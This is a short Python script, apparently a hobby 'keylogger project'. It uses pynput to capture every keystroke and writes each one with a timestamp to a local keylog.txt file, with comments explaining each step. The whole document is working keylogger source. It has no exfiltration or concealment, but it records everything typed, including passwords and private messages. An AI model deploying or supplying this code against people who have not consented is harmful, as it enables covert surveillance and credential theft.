"""
keylogger project
"""
import pynput
from pynput.keyboard import Key, Listener
import logging

#specify path where the log file will be stored
#store logs and format it with time and a message
log_dir = r""
logging.basicConfig(filename = (log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#this function will take every keypress as a parameter and log this information
def on_press(Key):
    logging.info(str(Key))

#create a listener instance and define the on_press method and join it with the main program thread
with Listener(on_press=on_press) as listener:
    listener.join()
    